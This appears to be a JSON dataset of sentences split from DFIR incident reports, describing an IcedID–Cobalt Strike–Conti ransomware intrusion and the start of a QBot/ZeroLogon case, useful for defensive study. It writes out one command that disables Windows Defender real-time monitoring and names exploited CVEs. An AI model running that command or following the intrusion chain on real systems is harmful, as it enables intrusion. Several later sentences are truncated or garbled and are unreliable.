        "text": "Nltest and net group were utilized to look for sensitive groups such as Domain Admins and Enterprise Admins.",
        "type": "",
        "report": "r-dfir-16",
        "line": 8,
        "index": 5368
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S9",
        "text": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 9,
        "index": 5369
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S10",
        "text": "The threat actors proceeded to install remote management tools such as Atera Agent and Splashtop.",
        "type": "",
        "report": "r-dfir-16",
        "line": 10,
        "index": 5370
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S11",
        "text": "Use of these 3rd party administrative tools allow the threat actors another \u201clegitimate\u201d means of persistence and access if they were to lose their malware connection.",
        "type": "",
        "report": "r-dfir-16",
        "line": 11,
        "index": 5371
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S12",
        "text": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "type": "",
        "report": "r-dfir-16",
        "line": 12,
        "index": 5372
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S13",
        "text": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
        "type": "",
        "report": "r-dfir-16",
        "line": 13,
        "index": 5373
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S14",
        "text": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "type": "",
        "report": "r-dfir-16",
        "line": 14,
        "index": 5374
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S15",
        "text": "On the following day, the seventh day of the intrusion, the threat actors made their next move.",
        "type": "",
        "report": "r-dfir-16",
        "line": 15,
        "index": 5375
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S16",
        "text": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "type": "",
        "report": "r-dfir-16",
        "line": 16,
        "index": 5376
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S17",
        "text": "From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 17,
        "index": 5377
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S18",
        "text": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
        "type": "",
        "report": "r-dfir-16",
        "line": 18,
        "index": 5378
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S19",
        "text": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
        "type": "",
        "report": "r-dfir-16",
        "line": 19,
        "index": 5379
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S20",
        "text": "After this, the threat actors went quiet.",
        "type": "",
        "report": "r-dfir-16",
        "line": 20,
        "index": 5380
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S21",
        "text": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "type": "",
        "report": "r-dfir-16",
        "line": 21,
        "index": 5381
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S22",
        "text": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "type": "",
        "report": "r-dfir-16",
        "line": 22,
        "index": 5382
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S23",
        "text": "A little discovery check-in was observed on the 14th day, but little else.",
        "type": "",
        "report": "r-dfir-16",
        "line": 23,
        "index": 5383
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S24",
        "text": "On the 19th day, the threat actors moved towards their final objectives.",
        "type": "",
        "report": "r-dfir-16",
        "line": 24,
        "index": 5384
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S25",
        "text": "They reviewed the directory structure of several hosts including domain controllers and backup servers.",
        "type": "",
        "report": "r-dfir-16",
        "line": 25,
        "index": 5385
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S26",
        "text": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
        "type": "",
        "report": "r-dfir-16",
        "line": 26,
        "index": 5386
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S27",
        "text": "However, they found that their execution failed.",
        "type": "",
        "report": "r-dfir-16",
        "line": 27,
        "index": 5387
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S28",
        "text": "They left for a few hours, and then returned, and attempted to exploit a couple of CVE\u2019s in an attempt to escalate privileges.",
        "type": "",
        "report": "r-dfir-16",
        "line": 28,
        "index": 5388
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S29",
        "text": "The threat actors had already secured domain admin access but it\u2019s possible the operator may have thought they lacked permissions when their first ransomware execution failed.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 29,
        "index": 5389
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S30",
        "text": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "type": "",
        "report": "r-dfir-16",
        "line": 30,
        "index": 5390
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S31",
        "text": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "type": "",
        "report": "r-dfir-16",
        "line": 31,
        "index": 5391
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S32",
        "text": "This time the execution worked as intended and resulted in domain wide ransomware.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 32,
        "index": 5392
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S33",
        "text": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \u201cStolen Image Evidence\u201d email campaign.",
        "type": "",
        "report": "r-dfir-16",
        "line": 33,
        "index": 5393
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S34",
        "text": "These initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 34,
        "index": 5394
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S35",
        "text": "The emails contain a link to a legitimate storage service like those offered by Google and Microsoft.",
        "type": "",
        "report": "r-dfir-16",
        "line": 35,
        "index": 5395
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S36",
        "text": "In this example, \u201chttp://storage.googleapis.com\u201d was used to host a zip file.",
        "type": "",
        "report": "r-dfir-16",
        "line": 36,
        "index": 5396
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S37",
        "text": "The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file.",
        "type": "",
        "report": "r-dfir-16",
        "line": 37,
        "index": 5397
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S38",
        "text": "Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 38,
        "index": 5398
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S39",
        "text": "Below is a configuration extraction of that initial IcedID malware from an automated sandbox analysis of the sample:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 39,
        "index": 5399
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S40",
        "text": "The graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 40,
        "index": 5400
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S41",
        "text": "Only one scheduled task was created during this intrusion.",
        "type": "",
        "report": "r-dfir-16",
        "line": 41,
        "index": 5401
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S42",
        "text": "The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 42,
        "index": 5402
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S43",
        "text": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "type": "",
        "report": "r-dfir-16",
        "line": 43,
        "index": 5403
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S44",
        "text": "The installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 44,
        "index": 5404
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S45",
        "text": "Atera agent is a remote monitoring and management system.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 45,
        "index": 5405
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S46",
        "text": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "type": "",
        "report": "r-dfir-16",
        "line": 46,
        "index": 5406
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S47",
        "text": "There were attempts to exploit Active Directory vulnerabilities CVE-2021-42278 and CVE-2021-42287 in order to create privileged accounts.",
        "type": "",
        "report": "r-dfir-16",
        "line": 47,
        "index": 5407
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S48",
        "text": "This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number).",
        "type": "",
        "report": "r-dfir-16",
        "line": 48,
        "index": 5408
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S49",
        "text": "The query status 9003 indicates that this does not exist.",
        "type": "",
        "report": "r-dfir-16",
        "line": 49,
        "index": 5409
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S50",
        "text": "The injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 50,
        "index": 5410
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S51",
        "text": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "type": "",
        "report": "r-dfir-16",
        "line": 51,
        "index": 5411
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S52",
        "text": "Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.",
        "type": "",
        "report": "r-dfir-16",
        "line": 52,
        "index": 5412
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S53",
        "text": "The exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 53,
        "index": 5413
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S54",
        "text": "A base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 54,
        "index": 5414
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S55",
        "text": "The decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender\u2019s real time monitoring: Set-MpPreference -DisableRealtimeMonitoring $true\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 55,
        "index": 5415
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S56",
        "text": "A number of process injections were seen during this intrusion.",
        "type": "",
        "report": "r-dfir-16",
        "line": 56,
        "index": 5416
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S57",
        "text": "The Cobalt Strike beacon used the CreateRemoteThread Win32 function in order to inject code into running processes.",
        "type": "",
        "report": "r-dfir-16",
        "line": 57,
        "index": 5417
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S58",
        "text": "The usage of this function triggers the Sysmon Event ID 8, a well known pattern of CS beacon activity.",
        "type": "",
        "report": "r-dfir-16",
        "line": 58,
        "index": 5418
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S59",
        "text": "Remote threads were created in Winlogon and Explorer processes.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 59,
        "index": 5419
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S60",
        "text": "The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 60,
        "index": 5420
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S61",
        "text": "The screenshot below shows the different \u201cDesiredAccess\u201d to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 61,
        "index": 5421
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S62",
        "text": "The table below maps the \u201cDesiredAccess\u201d values with the actual corresponding access rights, and examples of credentials dumping tools requesting those accesses:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 62,
        "index": 5422
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S63",
        "text": "*A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 63,
        "index": 5423
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S64",
        "text": "Those \u201cDesiredAccess\u201d values could be interesting to build detections or hunting queries if you are using Sysmon or such a verbose monitoring tool.",
        "type": "",
        "report": "r-dfir-16",
        "line": 64,
        "index": 5424
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S65",
        "text": "In our case, the access to LSASS process allowed the threat actors to compromise a domain admin account, which was then used to move laterally and deploy ransomware.",
        "type": "",
        "report": "r-dfir-16",
        "line": 65,
        "index": 5425
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S66",
        "text": "Multiple discovery techniques were observed throughout the case.",
        "type": "",
        "report": "r-dfir-16",
        "line": 66,
        "index": 5426
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S67",
        "text": "The initial discovery techniques were conducted on the beachhead host by the IcedID malware \u2013 focusing on determining the system language and security products installed (T1518.001).",
        "type": "",
        "report": "r-dfir-16",
        "line": 67,
        "index": 5427
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S68",
        "text": "Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration.",
        "type": "",
        "report": "r-dfir-16",
        "line": 68,
        "index": 5428
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S69",
        "text": "Discovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.",
        "type": "",
        "report": "r-dfir-16",
        "line": 69,
        "index": 5429
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S70",
        "text": "Threat actors also used \u201cchcp\u201d for discovery of the system locale/language (T1614.001).",
        "type": "",
        "report": "r-dfir-16",
        "line": 70,
        "index": 5430
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S71",
        "text": "Change Control Page (ChCP) is a Microsoft utility for changing the console control page (language).",
        "type": "",
        "report": "r-dfir-16",
        "line": 71,
        "index": 5431
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S72",
        "text": "In this case, the existing control page language was collected using the following command:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 72,
        "index": 5432
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S73",
        "text": "As a test, entering this on a command prompt shows a numeric value.",
        "type": "",
        "report": "r-dfir-16",
        "line": 73,
        "index": 5433
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S74",
        "text": "The Microsoft link shows the number of the language used (437 \u2013 United States).\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 74,
        "index": 5434
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S75",
        "text": "It is highly likely that the threat actors were establishing the country of origin based on the language used \u2013 an extra fail-safe check to ensure certain users or regions were not targeted.",
        "type": "",
        "report": "r-dfir-16",
        "line": 75,
        "index": 5435
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S76",
        "text": "The >&2 parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 76,
        "index": 5436
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S77",
        "text": "The second discovery was from a different Cobalt Strike beacon \u201cFaicuy4.exe\u201d which focused on domain discovery and user groups using the net command.",
        "type": "",
        "report": "r-dfir-16",
        "line": 77,
        "index": 5437
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S78",
        "text": "Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 78,
        "index": 5438
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S79",
        "text": "\u2018adf.bat\u2019 is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of a Ryuk intrusion.",
        "type": "",
        "report": "r-dfir-16",
        "line": 79,
        "index": 5439
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S80",
        "text": "The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.",
        "type": "",
        "report": "r-dfir-16",
        "line": 80,
        "index": 5440
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S81",
        "text": "The PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 81,
        "index": 5441
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S82",
        "text": "Some network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 82,
        "index": 5442
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S83",
        "text": "Filesystem discovery (T1083) was conducted to collect directory lists to a text file.",
        "type": "",
        "report": "r-dfir-16",
        "line": 83,
        "index": 5443
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S84",
        "text": "Other variations included:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 84,
        "index": 5444
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S85",
        "text": "On the 6th day, the threat actors began their lateral movement activity using SMB to transfer Cobalt Strike DLL\u2019s onto a domain controller and another server.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 85,
        "index": 5445
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S86",
        "text": "Services were then created on the hosts to execute the uploaded Cobalt Strike Beacons.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 86,
        "index": 5446
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S87",
        "text": "On the final day, right before execution of the ransomware, SMB was again used to transfer Cobalt Strike Beacon executable to the domain controllers.",
        "type": "",
        "report": "r-dfir-16",
        "line": 87,
        "index": 5447
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S88",
        "text": "The beacons were then executed using a remote service.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 88,
        "index": 5448
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S89",
        "text": "Known Cobalt Strike named pipes were observed on the Domain Controllers with these executable beacons.",
        "type": "",
        "report": "r-dfir-16",
        "line": 89,
        "index": 5449
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S90",
        "text": "Named pipes connections can be observed through Sysmon Event ID 18.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 90,
        "index": 5450
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S91",
        "text": "Note that the named pipes followed MSSE-[0-9]{4}-server pattern, which indicates that the threat actors were using the default Cobalt Strike Artifact Kit binaries:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 91,
        "index": 5451
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S92",
        "text": "We observed the IcedID DLL dropping multiple CS beacons on the beachhead.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 92,
        "index": 5452
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S93",
        "text": "Threat actors used Splashtop Streamer via Atera agent, allowing them to remotely connect to machines without using RDP tunneling or other techniques previously seen in our cases.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 93,
        "index": 5453
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S94",
        "text": "By default, the Splashtop Streamer is automatically installed together with the AteraAgent.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 94,
        "index": 5454
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S95",
        "text": "Splashtop Streamer usage leaves many network connections to *.api.splashtop.com and *.relay.splashtop.com on port 443:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 95,
        "index": 5455
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S96",
        "text": "We observed a default Cobalt Strike malleable C2 profile, using the jquery agent string.",
        "type": "",
        "report": "r-dfir-16",
        "line": 96,
        "index": 5456
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S97",
        "text": "This activity can be detected with relative ease by the ET rules.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 97,
        "index": 5457
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S98",
        "text": "There appeared to be no jitter configured, resulting in a constant stream of HTTP requests, and if using ET rules, constant alerts would be generated.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 98,
        "index": 5458
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S99",
        "text": "Just based on the ET Cobalt Strike rule, \u2018ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\u2019, there were in excess of 6K alerts generated.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 99,
        "index": 5459
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S100",
        "text": "Due to the length of this intrusion, we observerd the threat actors handing off between C2 servers.",
        "type": "",
        "report": "r-dfir-16",
        "line": 100,
        "index": 5460
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S101",
        "text": "We also observed one Cobalt Strike domain change IP resolutions three times, over the length of the case.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 101,
        "index": 5461
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S102",
        "text": "A configuration was not obtained for this server.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 102,
        "index": 5462
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S103",
        "text": "We did not observe any exfiltration indicators while analyzing host and network forensic artifacts.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 103,
        "index": 5463
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S104",
        "text": "This does not mean that there was no exfiltration, as this could have been performed via Cobalt Strike beacons over encrypted channels.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 104,
        "index": 5464
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S105",
        "text": "On the 19th day of the intrusion, the threat actors prepared for their final objectives.",
        "type": "",
        "report": "r-dfir-16",
        "line": 105,
        "index": 5465
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S106",
        "text": "From the beachhead host, the directory listings of the domain controllers were checked again, followed by the backup server.",
        "type": "",
        "report": "r-dfir-16",
        "line": 106,
        "index": 5466
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S107",
        "text": "On the beachhead host, we observed the threat actors attempt to execute the final ransomware payload.",
        "type": "",
        "report": "r-dfir-16",
        "line": 107,
        "index": 5467
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S108",
        "text": "From that host however the attempt failed.",
        "type": "",
        "report": "r-dfir-16",
        "line": 108,
        "index": 5468
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S109",
        "text": "The threat actors then proceeded to look for other elevation paths.",
        "type": "",
        "report": "r-dfir-16",
        "line": 109,
        "index": 5469
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S110",
        "text": "After a failed attempt with CVE-2021-42278 and CVE-2021-42287, the threat actors executed Cobalt Strike beacons on a couple of domain controllers.",
        "type": "",
        "report": "r-dfir-16",
        "line": 110,
        "index": 5470
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S111",
        "text": "Once they established this access, around twenty minutes later, they again attempted the ransomware deployment and this time the payload executed properly and began spreading across the network via SMB.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 111,
        "index": 5471
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S112",
        "text": "The threat actors deployed ransomware payload in a DLL, named x64.dll, which was executed using backup.bat batch script.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 112,
        "index": 5472
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S113",
        "text": "This x64.dll DLL contains fingerprints, \u201cconti_v3.dll\u201d, seen in our previous cases:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 113,
        "index": 5473
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S114",
        "text": "We didn\u2019t dig into reversing this DLL, as a detailed step-by-step analysis already exists, and gives an excellent explanation of command line parameters used during the execution of Conti ransomware.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 114,
        "index": 5474
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S115",
        "text": "Once the threat actors pushed the encryptor to C$, an excessive SMB network activity were generated in a short period of time (~7K) as indicated by the chart.\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 115,
        "index": 5475
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S116",
        "text": "This resulted in files being encrypted and a \u2018readme.txt\u2019 ransom note generated on the hosts:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 116,
        "index": 5476
    },
    {
        "id": "dfir-reports-filtered/r-dfir-16.md:::S117",
        "text": "The ransom note has slightly been modified from our last Conti cases:\n",
        "type": "",
        "report": "r-dfir-16",
        "line": 117,
        "index": 5477
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S0",
        "text": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
        "type": "",
        "report": "r-dfir-17",
        "line": 0,
        "index": 5478
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S1",
        "text": "The first activity of QBot was seen 5 minutes after the DLL was executed.",
        "type": "",
        "report": "r-dfir-17",
        "line": 1,
        "index": 5479
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S2",
        "text": "Various automated discovery commands were used to\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 2,
        "index": 5480
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S3",
        "text": "Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 3,
        "index": 5481
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S4",
        "text": "Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 4,
        "index": 5482
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S5",
        "text": "The executable named cool.exe to an empty string, retrieves the Domain Admin password Hash, and Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability.",
        "type": "",
        "report": "r-dfir-17",
        "line": 5,
        "index": 5483
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S6",
        "text": "The executable used bears striking similarity to the one used in a previous case cool.exe to an empty string, retrieves the Domain Admin password Hash, and\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 6,
        "index": 5484
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S7",
        "text": "The domain admin hash was then used on the beachhead through an over-pass-the-hash attack .",
        "type": "",
        "report": "r-dfir-17",
        "line": 7,
        "index": 5485
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S8",
        "text": "After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 8,
        "index": 5486
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S9",
        "text": ".",
        "type": "",
        "report": "r-dfir-17",
        "line": 9,
        "index": 5487
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S10",
        "text": "To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 10,
        "index": 5488
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S11",
        "text": ".",
        "type": "",
        "report": "r-dfir-17",
        "line": 11,
        "index": 5489
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S12",
        "text": "The threat actor gained their initial access through the execution of a malicious DLL.",
        "type": "",
        "report": "r-dfir-17",
        "line": 12,
        "index": 5490
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S13",
        "text": "Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL.",
        "type": "",
        "report": "r-dfir-17",
        "line": 13,
        "index": 5491
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S14",
        "text": "In this case, however, the execution started directly from the qbot DLL found here\n",
        "type": "",
        "report": "r-dfir-17",
        "line": 14,
        "index": 5492
    },
    {
        "id": "dfir-reports-filtered/r-dfir-17.md:::S15",
